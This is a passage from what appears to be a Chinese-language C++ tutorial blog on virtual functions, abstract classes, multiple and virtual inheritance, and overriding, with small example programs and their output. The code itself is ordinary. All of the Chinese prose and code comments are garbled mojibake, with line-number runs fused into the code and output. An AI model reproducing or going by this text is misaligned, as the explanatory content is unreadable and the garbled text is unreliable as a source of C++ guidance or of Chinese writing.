æŒ‡é’ˆè¿›è¡Œåˆå§‹åŒ– c) åªæœ‰å½“å¯¹è±¡çš„æ„é€ å…¨éƒ¨å®Œæˆåï¼ŒVPTR æŒ‡é’ˆçš„æŒ‡å‘æ‰èƒ½æœ€ç»ˆç¡®å®š 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; // åœ¨çˆ¶ç±»çš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨è™šå‡½æ•° print(); } virtual void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int a, int c) : Parent(a) { this-&gt;c = c; } virtual void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Child child(5, 8); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1I\'m parent, a = 5 çº¯è™šå‡½æ•°å’ŒæŠ½è±¡ç±»çº¯è™šå‡½æ•°å’ŒæŠ½è±¡ç±»çš„åŸºæœ¬æ¦‚å¿µåŸºæœ¬æ¦‚å¿µï¼š a) çº¯è™šå‡½æ•°æ˜¯ä¸€ä¸ªåœ¨åŸºç±»ä¸­è¯´æ˜çš„è™šå‡½æ•°ï¼Œä¸”åœ¨åŸºç±»ä¸­æ²¡æœ‰è¢«å®šä¹‰ï¼Œè¦æ±‚ä»»ä½•æ´¾ç”Ÿç±»éƒ½å®šä¹‰è‡ªå·±çš„ç‰ˆæœ¬ b) çº¯è™šå‡½æ•°ä¸ºå„æ´¾ç”Ÿç±»æä¾›ä¸€ä¸ªå…¬å…±ç•Œé¢ï¼Œå¯ä»¥å®ç°æ¥å£çš„å°è£…å’Œè®¾è®¡ã€è½¯ä»¶çš„æ¨¡å—åŠŸèƒ½åˆ’åˆ† c) çº¯è™šå‡½æ•°çš„å£°æ˜å½¢å¼ï¼š virtual ç±»å‹ å‡½æ•°å ( å‚æ•°è¡¨ ) = 0; d) ä¸€ä¸ªå…·æœ‰çº¯è™šå‡½æ•°çš„åŸºç±»ç§°ä¸ºæŠ½è±¡ç±» ä½¿ç”¨é™åˆ¶ï¼š a) å¯ä»¥å£°æ˜æŠ½è±¡ç±»çš„æŒ‡é’ˆå’Œå¼•ç”¨ b) æŠ½è±¡ç±»ä¸èƒ½åˆ›å»ºå¯¹è±¡ï¼ˆå®ä¾‹åŒ–ï¼‰ c) æŠ½è±¡ç±»ä¸èƒ½ä½œä¸ºå‡½æ•°çš„å‚æ•°ç±»å‹å’Œè¿”å›å€¼ç±»å‹ çº¯è™šå‡½æ•°å’ŒæŠ½è±¡ç±»çš„åº”ç”¨æ¡ˆä¾‹å®šä¹‰ä¸€ä¸ªå›¾å½¢æŠ½è±¡ç±» Figureï¼Œå¹¶å£°æ˜äº†è´Ÿè´£è®¡ç®—å›¾å½¢é¢ç§¯çš„çº¯è™šå‡½æ•° getArea()ï¼Œç„¶åå†å®šä¹‰ Circleã€Triangleã€Squre æ´¾ç”Ÿç±»ï¼Œå¹¶å„è‡ªå®ç°äº†çº¯è™šå‡½æ•° getArea() æ¥è®¡ç®—ä¸åŒå›¾å½¢çš„é¢ç§¯ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;iostream&gt;using namespace std;// æŠ½è±¡ç±»class Figure {public: // å£°æ˜çº¯è™šå‡½æ•°ï¼Œè®¡ç®—é¢ç§¯ virtual double getArea() = 0;};class Circle : public Figure {public: Circle(double r) { this-&gt;r = r; } // è®¡ç®—åœ†çš„é¢ç§¯ virtual double getArea() { double area = 3.14 * r * r; cout &lt;&lt; "åœ†çš„é¢ç§¯: " &lt;&lt; area &lt;&lt; endl; return area; }private: double r;};class Triangle : public Figure {public: Triangle(double a, double b) { this-&gt;a = a; this-&gt;b = b; } // è®¡ç®—ä¸‰è§’å½¢çš„é¢ç§¯ virtual double getArea() { double area = a * b / 2; cout &lt;&lt; "ä¸‰è§’å½¢çš„é¢ç§¯: " &lt;&lt; area &lt;&lt; endl; return area; }private: double a; double b;};class Square : public Figure {public: Square(double a, double b) { this-&gt;a = a; this-&gt;b = b; } // è®¡ç®—å››è¾¹å½¢çš„é¢ç§¯ virtual double getArea() { double area = a * b; cout &lt;&lt; "å››è¾¹å½¢çš„é¢ç§¯: " &lt;&lt; area &lt;&lt; endl; return area; }private: double a; double b;};void printArea(Figure* base) { base-&gt;getArea();}int main() { // Figure f; // é”™è¯¯å†™æ³•ï¼ŒæŠ½è±¡ç±»ä¸èƒ½å®ä¾‹åŒ– Triangle Triangle(20, 30); Circle circle(6.8); Square square(50, 60); // å¯ä»¥å£°æ˜æŠ½è±¡ç±»çš„æŒ‡é’ˆ Figure* pBase = new Circle(5.3); pBase-&gt;getArea(); // å¯ä»¥å£°æ˜æŠ½è±¡ç±»çš„å¼•ç”¨ Figure&amp; base = square; base.getArea(); printArea(&amp;Triangle); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123åœ†çš„é¢ç§¯: 88.2026å››è¾¹å½¢çš„é¢ç§¯: 3000ä¸‰è§’å½¢çš„é¢ç§¯: 300 çº¯è™šå‡½æ•°å’ŒæŠ½è±¡ç±»åœ¨å¤šç»§æ‰¿ä¸­çš„åº”ç”¨æ¡ˆä¾‹C++ ä¸­æ²¡æœ‰ Java ä¸­çš„æ¥å£æ¦‚å¿µï¼Œä½†å¯ä»¥ä½¿ç”¨æŠ½è±¡ç±»å’Œçº¯è™šå‡½æ•°æ¨¡æ‹Ÿ Java ä¸­çš„æ¥å£ï¼ˆä»£ç å¦‚ä¸‹ï¼‰ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒC++ ä¸­çš„æ¥å£ç±»åªæœ‰å‡½æ•°åŸå‹å®šä¹‰ï¼Œæ²¡æœ‰ä»»ä½•æ•°æ®çš„å®šä¹‰ï¼ŒåŒæ—¶ç»§æ‰¿å¤šä¸ªæ¥å£ç±»ä¸ä¼šå¸¦æ¥äºŒä¹‰æ€§å’Œå¤æ‚æ€§ç­‰é—®é¢˜ã€‚C++ é¢å‘æŠ½è±¡ç±»ç¼–ç¨‹ï¼ˆJava é¢å‘æ¥å£ç¼–ç¨‹ï¼‰æ˜¯é¡¹ç›®å¼€å‘ä¸­é‡è¦æŠ€èƒ½ä¹‹ä¸€ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;iostream&gt;using namespace std;// å®šä¹‰æ¥å£ç±»ä¸€class Interface1 {public: virtual int add(int a, int b) = 0; virtual void print() = 0;};// å®šä¹‰æ¥å£ç±»äºŒclass Interface2 {public: virtual int mult(int a, int b) = 0; virtual void print() = 0;};// å®šä¹‰çˆ¶ç±»class Parent {public: Parent() { this-&gt;a = 8; } virtual ~Parent() { } virtual int getA() { return a; }private: int a;};// å®šä¹‰å­ç±»ï¼Œé¦–å…ˆç»§æ‰¿çˆ¶ç±»ï¼Œç„¶åç»§æ‰¿å¤šä¸ªæ¥å£ç±»class Child : public Parent, public Interface1, public Interface2 {public: int add(int a, int b) { return a + b; } int mult(int a, int b) { return a * b; } void print() { cout &lt;&lt; "Child::print() å‡½æ•°è¢«æ‰§è¡Œ" &lt;&lt; endl; }};int main() { Child child; child.print(); Parent* parent = &amp;child; cout &lt;&lt; "a = " &lt;&lt; parent-&gt;getA() &lt;&lt; endl; Interface1* interface1 = &amp;child; int result1 = interface1-&gt;add(2, 5); cout &lt;&lt; "2 + 5 = " &lt;&lt; result1 &lt;&lt; endl; Interface2* interface2 = &amp;child; int result2 = interface2-&gt;mult(3, 6); cout &lt;&lt; "3 * 6 = " &lt;&lt; result2 &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123a = 82 + 5 = 73 * 6 = 18 çº¯è™šå‡½æ•°å’ŒæŠ½è±¡ç±»åœ¨å¤šç»§æ‰¿ä¸­çš„ä½¿ç”¨æ€»ç»“C++ ä¸­æ²¡æœ‰ Java ä¸­çš„æ¥å£æ¦‚å¿µï¼š ç»å¤§å¤šæ•°é¢å‘å¯¹è±¡è¯­è¨€éƒ½ä¸æ”¯æŒå¤šç»§æ‰¿ ç»å¤§å¤šæ•°é¢å‘å¯¹è±¡è¯­è¨€éƒ½æ”¯æŒæ¥å£çš„æ¦‚å¿µ C++ ä¸­æ²¡æœ‰ Java ä¸­çš„æ¥å£æ¦‚å¿µï¼Œä½†å¯ä»¥ä½¿ç”¨æŠ½è±¡ç±»å’Œçº¯è™šå‡½æ•°æ¨¡æ‹Ÿ Java ä¸­çš„æ¥å£ C++ ä¸­çš„æ¥å£ç±»åªæœ‰å‡½æ•°åŸå‹å®šä¹‰ï¼Œæ²¡æœ‰ä»»ä½•æ•°æ®çš„å®šä¹‰ï¼ˆä»£ç å¦‚ä¸‹ï¼‰ â˜…ç‚¹å‡»æ˜¾ç¤ºç¤ºä¾‹ä»£ç â˜… 1234567class Interface { public: virtual void func1() = 0; virtual void func2(int i) = 0; virtual void func3(int i) = 0; }; å·¥ç¨‹ä¸Šå¤šç»§æ‰¿çš„ä½¿ç”¨è¯´æ˜ï¼š a) å¤šç»§æ‰¿å·²ç»è¢«å®é™…å¼€å‘ç»éªŒæ‰€æŠ›å¼ƒ b) å·¥ç¨‹å¼€å‘ä¸­çœŸæ­£æ„ä¹‰ä¸Šçš„å¤šç»§æ‰¿æ˜¯å‡ ä¹ä¸è¢«ä½¿ç”¨çš„ c) å¤šç»§æ‰¿å¸¦æ¥çš„ä»£ç å¤æ‚æ€§è¿œå¤šäºå…¶å¸¦æ¥çš„ä¾¿åˆ© d) å¤šç»§æ‰¿å¯¹ä»£ç ç»´æŠ¤æ€§ä¸Šçš„å½±å“æ˜¯ç¾éš¾æ€§çš„ e) åœ¨è®¾è®¡æ–¹æ³•ä¸Šï¼Œä»»ä½•å¤šç»§æ‰¿éƒ½å¯ä»¥ä½¿ç”¨å•ç»§æ‰¿ä»£æ›¿ f) åœ¨å¤šç»§æ‰¿ä¸­ï¼Œä½¿ç”¨è™šç»§æ‰¿ä¸èƒ½å®Œå…¨è§£å†³äºŒä¹‰æ€§çš„é—®é¢˜ è™šç»§æ‰¿çš„ä½¿ç”¨ä¸é€‚ç”¨åœºæ™¯ä»‹ç» è™šç»§æ‰¿åªé€‚ç”¨äºæœ‰å…±åŒåŸºç±»ï¼ˆå…¬å…±åŸºç±»ï¼‰çš„å¤šç»§æ‰¿åœºæ™¯ï¼ˆé’»çŸ³è±å½¢ â—‡ï¼‰ï¼Œå¦‚å³å›¾æ‰€ç¤º å¯¹äº V å­—å½¢çš„å¤šç»§æ‰¿åœºæ™¯ï¼Œè™šç»§æ‰¿æ˜¯æ²¡åŠæ³•è§£å†³äºŒä¹‰æ€§é—®é¢˜çš„ï¼Œå¦‚å³å›¾æ‰€ç¤º å·¥ç¨‹ä¸Šç»§æ‰¿å¤šä¸ªæ¥å£ç±»çš„ä½¿ç”¨è¯´æ˜ï¼š a) ç»§æ‰¿å¤šä¸ªæ¥å£ç±»ä¸ä¼šå¸¦æ¥äºŒä¹‰æ€§å’Œå¤æ‚æ€§ç­‰é—®é¢˜ b) å¤šç»§æ‰¿å¯ä»¥é€šè¿‡ç²¾å¿ƒè®¾è®¡çš„å•ç»§æ‰¿å’Œæ¥å£ç±»æ¥ä»£æ›¿ c) æ¥å£ç±»åªæ˜¯ä¸€ä¸ªåŠŸèƒ½è¯´æ˜ï¼Œè€Œä¸æ˜¯åŠŸèƒ½å®ç°ï¼Œå­ç±»éœ€è¦æ ¹æ®åŠŸèƒ½è¯´æ˜å®šä¹‰åŠŸèƒ½å®ç° var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ å…¥é—¨åŸºç¡€ä¹‹å…«",url:"/posts/4c2ae4c0.html",text:'å¤šç»§æ‰¿å¤šç»§æ‰¿æ¦‚å¿µ a) ä¸€ä¸ªç±»æœ‰å¤šä¸ªç›´æ¥åŸºç±»ï¼ˆçˆ¶ç±»ï¼‰çš„ç»§æ‰¿å…³ç³»ç§°ä¸ºå¤šç»§æ‰¿ b) ç±» C å¯ä»¥æ ¹æ®è®¿é—®æ§åˆ¶åŒæ—¶ç»§æ‰¿ç±» A å’Œç±» B çš„æˆå‘˜ï¼Œå¹¶æ·»åŠ è‡ªå·±çš„æˆå‘˜ c) å¤šç»§æ‰¿å£°æ˜è¯­æ³• 1234class æ´¾ç”Ÿç±»å : è®¿é—®æ§åˆ¶ åŸºç±»å1 , è®¿é—®æ§åˆ¶ åŸºç±»å2 , â€¦ , è®¿é—®æ§åˆ¶ åŸºç±»ån{ æ•°æ®æˆå‘˜å’Œæˆå‘˜å‡½æ•°å£°æ˜}; å¤šç»§æ‰¿çš„ç®€å•åº”ç”¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;using namespace std;class Base1 {public: Base1(int a) { this-&gt;a = a; } void printA() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Base2 {public: Base2(int b) { this-&gt;b = b; } void printB() { cout &lt;&lt; "b = " &lt;&lt; b &lt;&lt; endl; }private: int b;};class Base3 : public Base1, public Base2 {public: Base3(int a, int b, int c) : Base1(a), Base2(b) { this-&gt;c = c; } void printC() { cout &lt;&lt; "c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Base3 base(1, 2, 3); base.printA(); base.printB(); base.printC(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 123a = 1b = 2c = 3 æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°å’Œæˆå‘˜è®¿é—®åœ¨å¤šç»§æ‰¿çš„æ´¾ç”Ÿç±»ä¸­ï¼Œå…¶æ„é€ å‡½æ•°å’Œæˆå‘˜è®¿é—®çš„ç‰¹æ€§å¦‚ä¸‹ï¼š æ‹¥æœ‰å¤šä¸ªåŸºç±»çš„æ´¾ç”Ÿç±»çš„æ„é€ å‡½æ•°ï¼Œå¯ä»¥ç”¨åˆå§‹åŒ–åˆ—è¡¨è°ƒç”¨åŸºç±»æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–æ•°æ®æˆå‘˜ã€‚ æ‰§è¡Œé¡ºåºä¸å•ç»§æ‰¿æ„é€ å‡½æ•°æƒ…å†µç±»ä¼¼ï¼Œå¤šä¸ªç›´æ¥åŸºç±»æ„é€ å‡½æ•°æ‰§è¡Œé¡ºåºå–å†³äºå®šä¹‰æ´¾ç”Ÿç±»æ—¶æŒ‡å®šçš„å„ä¸ªç»§æ‰¿åŸºç±»çš„é¡ºåºã€‚ ä¸€ä¸ªæ´¾ç”Ÿç±»å¯¹è±¡æ‹¥æœ‰å¤šä¸ªç›´æ¥æˆ–é—´æ¥åŸºç±»çš„æˆå‘˜ã€‚ä¸åŒåæˆå‘˜è®¿é—®ä¸ä¼šå‡ºç°äºŒä¹‰æ€§ï¼Œå¦‚æœä¸åŒçš„åŸºç±»æœ‰åŒåæˆå‘˜ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»å¯¹è±¡è®¿é—®æ—¶åº”è¯¥åŠ ä»¥è¯†åˆ«ã€‚ è™šç»§æ‰¿è™šç»§æ‰¿çš„æ¦‚å¿µ æ€»ç»“ï¼š å¦‚æœä¸€ä¸ªæ´¾ç”Ÿç±»ä»å¤šä¸ªåŸºç±»ç»§æ‰¿ï¼Œè€Œè¿™äº›åŸºç±»åˆæœ‰ä¸€ä¸ªå…±åŒçš„åŸºç±»ï¼ˆå…¬å…±åŸºç±»ï¼‰ï¼Œåˆ™åœ¨å¯¹è¯¥åŸºç±»ä¸­å£°æ˜çš„æˆå‘˜è¿›è¡Œè®¿é—®æ—¶ï¼Œå¯èƒ½ä¼šäº§ç”ŸäºŒä¹‰æ€§ã€‚ å¦‚æœåœ¨å¤šæ¡ç»§æ‰¿è·¯å¾„ä¸Šæœ‰ä¸€ä¸ªå…¬å…±çš„åŸºç±»ï¼Œé‚£ä¹ˆåœ¨ç»§æ‰¿è·¯å¾„çš„æŸå¤„æ±‡åˆç‚¹ï¼Œè¿™ä¸ªå…¬å…±åŸºç±»å°±ä¼šåœ¨æ´¾ç”Ÿç±»çš„å¯¹è±¡ä¸­äº§ç”Ÿå¤šä¸ªåŸºç±»å­å¯¹è±¡ è¦ä½¿è¿™ä¸ªå…¬å…±åŸºç±»åœ¨æ´¾ç”Ÿç±»ä¸­åªäº§ç”Ÿä¸€ä¸ªå­å¯¹è±¡ï¼Œå¿…é¡»å¯¹è¿™ä¸ªåŸºç±»å£°æ˜ä¸ºè™šç»§æ‰¿ï¼Œä½¿è¿™ä¸ªåŸºç±»æˆä¸º è™šåŸºç±»ã€‚ è™šç»§æ‰¿å£°æ˜éœ€è¦ä½¿ç”¨å…³é”®å­—ï¼švirtual è™šç»§æ‰¿çš„ç®€å•åº”ç”¨ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;using namespace std;class Base {public: Base(int x) { this-&gt;x = x; cout &lt;&lt; "Base ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } void printX() { cout &lt;&lt; "x = " &lt;&lt; x &lt;&lt; endl; }private: int x;};// å£°æ˜è™šç»§æ‰¿class Base1 : virtual public Base {public: Base1(int a, int x) : Base(x) { this-&gt;a = a; } void printA() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};// å£°æ˜è™šç»§æ‰¿class Base2 : virtual public Base {public: Base2(int b, int x) : Base(x) { this-&gt;b = b; } void printB() { cout &lt;&lt; "b = " &lt;&lt; b &lt;&lt; endl; }private: int b;};class Base3 : public Base1, public Base2 {public: // ç”±äºçˆ¶ç±»å’Œè™šåŸºç±»æ²¡æœ‰é»˜è®¤çš„æ— å‚æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥è¿™é‡Œçš„æ´¾ç”Ÿç±»éœ€è¦åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­ï¼Œæ˜¾å¼è°ƒç”¨çˆ¶ç±»ã€è™šåŸºç±»çš„æœ‰å‚æ„é€ å‡½æ•° Base3(int a, int b, int c, int x) : Base1(a, x), Base2(b, x), Base(x) { this-&gt;c = c; } void printC() { cout &lt;&lt; "c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Base3 base(1, 2, 3, 4); // è™šåŸºç±»Baseçš„æ„é€ å‡½æ•°åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ base.printA(); base.printB(); base.printC(); base.printX(); // å½“ä¸å£°æ˜è™šç»§æ‰¿çš„æ—¶å€™ï¼Œæ­¤å†™æ³•ä¼šäº§ç”ŸäºŒä¹‰æ€§ï¼ŒC++ç¼–è¯‘å™¨ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯ return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12345Base ç±»çš„æ„é€ å‡½æ•°è¢«è°ƒç”¨a = 1b = 2c = 3x = 4 å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœè™šåŸºç±»å£°æ˜äº†éé»˜è®¤å½¢å¼çš„ï¼ˆå³å¸¦å‚æ•°çš„ï¼‰æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”æ²¡æœ‰å£°æ˜é»˜è®¤å½¢å¼çš„ï¼ˆæ— å‚ï¼‰æ„é€ å‡½æ•°ï¼Œæ­¤æ—¶åœ¨æ•´ä¸ªç»§æ‰¿å…³ç³»ä¸­ï¼Œç›´æ¥æˆ–è€…é—´æ¥ç»§æ‰¿è™šåŸºç±»çš„æ‰€æœ‰æ´¾ç”Ÿç±»ï¼Œéƒ½å¿…é¡»åœ¨æ„é€ å‡½æ•°çš„æˆå‘˜åˆå§‹åŒ–åˆ—è¡¨ä¸­åˆ—å‡ºå¯¹è™šåŸºç±»çš„åˆå§‹åŒ–ã€‚å› ä¸ºæ¶‰åŠåˆ°å¤šé‡ç»§æ‰¿å’Œè™šç»§æ‰¿ï¼Œä¸ºé¿å…æ´¾ç”Ÿç±»å› è°ƒç”¨å¤šä¸ªçˆ¶ç±»çš„æ„é€ å‡½æ•°åå¤šæ¬¡æ„é€ æ›´ä¸Šå±‚è™šåŸºç±»ï¼Œæ‰€ä»¥éœ€è¦æ´¾ç”Ÿç±»è‡ªå·±æ˜¾ç¤ºè°ƒç”¨ç»§æ‰¿è€Œæ¥çš„è™šåŸºç±»çš„æ„é€ å‡½æ•°ï¼Œè€Œç»§æ‰¿é“¾ä¸Šå…¶å®ƒæ‰€æœ‰å¯¹è™šåŸºç±»çš„æ„é€ å‡½æ•°è°ƒç”¨å°†è¢«å¿½ç•¥ã€‚ç®€å•ä¸€å¥è¯æ¦‚å†µï¼šçˆ¶ç±»ä¸ä¼šå¸®å­ç±»è°ƒç”¨è™šåŸºç±»çš„æ„é€ å‡½æ•°ï¼Œå­ç±»åœ¨æ„é€ æ—¶å¿…é¡»è‡ªå·±åˆå§‹åŒ–æ‰€æœ‰è™šåŸºç±»ã€‚ è™šç»§æ‰¿çš„é€‚ç”¨åœºæ™¯ è™šç»§æ‰¿åªé€‚ç”¨äºæœ‰å…±åŒåŸºç±»ï¼ˆå…¬å…±åŸºç±»ï¼‰çš„å¤šç»§æ‰¿åœºæ™¯ï¼ˆé’»çŸ³è±å½¢ â—‡ï¼‰ï¼Œå¦‚å³å›¾æ‰€ç¤º å¯¹äº V å­—å½¢çš„å¤šç»§æ‰¿åœºæ™¯ï¼ˆä»£ç å¦‚ä¸‹ï¼‰ï¼Œè™šç»§æ‰¿æ˜¯æ²¡åŠæ³•è§£å†³äºŒä¹‰æ€§é—®é¢˜çš„ï¼Œå¦‚å³å›¾æ‰€ç¤º 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;using namespace std;class Base1 {public: Base1(int a) { this-&gt;a = a; } void print() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Base2 {public: Base2(int b) { this-&gt;b = b; } void print() { cout &lt;&lt; "b = " &lt;&lt; b &lt;&lt; endl; }private: int b;};class Base3 : virtual public Base1, virtual public Base2 {public: Base3(int a, int b) : Base1(a), Base2(b) { }};int main() { Base3 base(1, 2); // è™šç»§æ‰¿åªé€‚ç”¨äºæœ‰å…±åŒåŸºç±»ï¼ˆå…¬å…±åŸºç±»ï¼‰çš„å¤šç»§æ‰¿åœºæ™¯ï¼ˆé’»çŸ³è±å½¢ â—‡ï¼‰ // å³ä½¿ä¸Šé¢å£°æ˜äº†è™šç»§æ‰¿ï¼Œä½†æ­¤å†™æ³•ä»ç„¶ä¼šäº§ç”ŸäºŒä¹‰æ€§ï¼ŒC++ç¼–è¯‘å™¨ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯ // base.print(); base.Base1::print(); base.Base2::print(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12a = 1b = 2 å¤šæ€å¤šæ€æ˜¯é¢å‘å¯¹è±¡çš„ä¸‰å¤§æ¦‚å¿µï¼ˆå¦‚ä¸‹ï¼‰ä¹‹ä¸€ï¼ŒæŒ‰å­—é¢çš„æ„æ€å°±æ˜¯å¤šç§å½¢æ€ã€‚å½“ç±»ä¹‹é—´å­˜åœ¨å±‚æ¬¡ç»“æ„ï¼Œå¹¶ä¸”ç±»ä¹‹é—´æ˜¯é€šè¿‡ç»§æ‰¿å…³è”æ—¶ï¼Œå°±ä¼šä½¿ç”¨åˆ°å¤šæ€ã€‚C++ çš„å¤šæ€æ„å‘³ç€è°ƒç”¨æˆå‘˜å‡½æ•°æ—¶ï¼Œä¼šæ ¹æ®è°ƒç”¨å‡½æ•°çš„å¯¹è±¡çš„ç±»å‹æ¥æ‰§è¡Œä¸åŒçš„å‡½æ•°ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¤šæ€æ˜¯è®¾è®¡æ¨¡å¼çš„åŸºç¡€ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æ¡†æ¶çš„åŸºçŸ³ã€‚ å°è£…ï¼šçªç ´äº† C è¯­è¨€å‡½æ•°çš„æ¦‚å¿µã€‚ ç»§æ‰¿ï¼šæé«˜äº†ä»£ç çš„å¯é‡ç”¨æ€§ã€‚ å¤šæ€ï¼šå¤šæ€æ˜¯æŒ‡åœ¨ä¸åŒç»§æ‰¿å…³ç³»çš„ç±»å¯¹è±¡ä¸­ï¼Œå»è°ƒåŒä¸€å‡½æ•°ï¼Œäº§ç”Ÿäº†ä¸åŒçš„è¡Œä¸ºã€‚å¤šæ€çš„ä¸€èˆ¬ä½¿ç”¨æ–¹å¼ï¼Œæ˜¯ä½¿ç”¨ä¸€ä¸ªçˆ¶ç±»çš„æŒ‡é’ˆæˆ–å¼•ç”¨å»è°ƒç”¨å­ç±»ä¸­è¢«é‡å†™çš„æ–¹æ³•ã€‚ å‡½æ•°é‡å†™å‡½æ•°é‡å†™çš„æ¦‚å¿µ å‡½æ•°é‡å†™æ˜¯æŒ‡åœ¨å­ç±»ä¸­å®šä¹‰ä¸çˆ¶ç±»ä¸­åŸå‹ç›¸åŒçš„å‡½æ•° çˆ¶ç±»ä¸­è¢«é‡å†™çš„å‡½æ•°ä¾ç„¶ä¼šç»§æ‰¿ç»™å­ç±» é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨å­ç±»ä¸­é‡å†™çš„å‡½æ•°å°†éšè—çˆ¶ç±»ä¸­çš„å‡½æ•° é€šè¿‡ä½œç”¨åŸŸåˆ†è¾¨ç¬¦ :: å¯ä»¥è®¿é—®åˆ°çˆ¶ç±»ä¸­è¢«éšè—çš„å‡½æ•° å‡½æ•°é‡å†™åªå‘ç”Ÿåœ¨çˆ¶ç±»ä¸å­ç±»ä¹‹é—´ï¼Œè€Œå‡½æ•°é‡è½½åªå‘ç”Ÿåœ¨åŒä¸€ä¸ªç±»ä¸­ å‡½æ•°é‡å†™çš„åº”ç”¨12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;using namespace std;class Parent {public: Parent(int a) { this-&gt;a = a; } void print() { cout &lt;&lt; "I\'m parent, a = " &lt;&lt; a &lt;&lt; endl; }private: int a;};class Child : public Parent {public: Child(int a, int c) : Parent(a) { this-&gt;c = c; } // å­ç±»é‡å†™çˆ¶ç±»ä¸­çš„å‡½æ•° void print() { cout &lt;&lt; "I\'m child, c = " &lt;&lt; c &lt;&lt; endl; }private: int c;};int main() { Child child(3, 7); // æ‰§è¡Œå­ç±»çš„å‡½æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹å­ç±»ä¸­é‡å†™çš„å‡½æ•°å°†éšè—çˆ¶ç±»ä¸­çš„å‡½æ•° child.print(); // æ‰§è¡Œçˆ¶ç±»çš„å‡½æ•°ï¼Œé€šè¿‡ä½œç”¨åŸŸåˆ†è¾¨ç¬¦"::"å¯ä»¥è®¿é—®åˆ°çˆ¶ç±»ä¸­è¢«éšè—çš„å‡½æ•° child.Parent::print(); return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12I\'m child, c = 7I\'m parent, a = 3 å‡½æ•°é‡å†™ä¸å‡½æ•°é‡è½½çš„åŒºåˆ« å‡½æ•°é‡è½½ å¿…é¡»åœ¨åŒä¸€ä¸ªç±»ä¸­è¿›è¡Œ å­ç±»æ— æ³•é‡è½½çˆ¶ç±»çš„å‡½æ•°ï¼Œçˆ¶ç±»åŒåå‡½æ•°å°†è¢«å­ç±»çš„è¦†ç›– é‡è½½æ˜¯åœ¨ç¼–è¯‘æœŸé—´æ ¹æ®å‚æ•°ç±»å‹ã€ä¸ªæ•°å’Œé¡ºåºå†³å®šå‡½æ•°çš„è°ƒç”¨ å‡½æ•°é‡å†™ å¿…é¡»å‘ç”Ÿäºçˆ¶ç±»ä¸å­ç±»ä¹‹é—´ çˆ¶ç±»ä¸å­ç±»ä¸­çš„å‡½æ•°å¿…é¡»æœ‰å®Œå…¨ç›¸åŒçš„åŸå‹ ä½¿ç”¨ virtual å…³é”®å­—å£°æ˜ä¹‹åï¼Œèƒ½å¤Ÿäº§ç”Ÿå¤šæ€ï¼ˆå¦‚æœä¸ä½¿ç”¨ virtual å…³é”®å­—å£°æ˜ï¼Œé‚£å«é‡å®šä¹‰ï¼‰ è™šå‡½æ•°ç±»å‹å…¼å®¹åŸåˆ™é‡ä¸Šå‡½æ•°é‡å†™å½“ ç±»å‹å…¼å®¹åŸåˆ™ é‡ä¸Šå‡½æ•°é‡å†™æ—¶ï¼Œæ‰§è¡Œä»¥ä¸‹ä»£ç 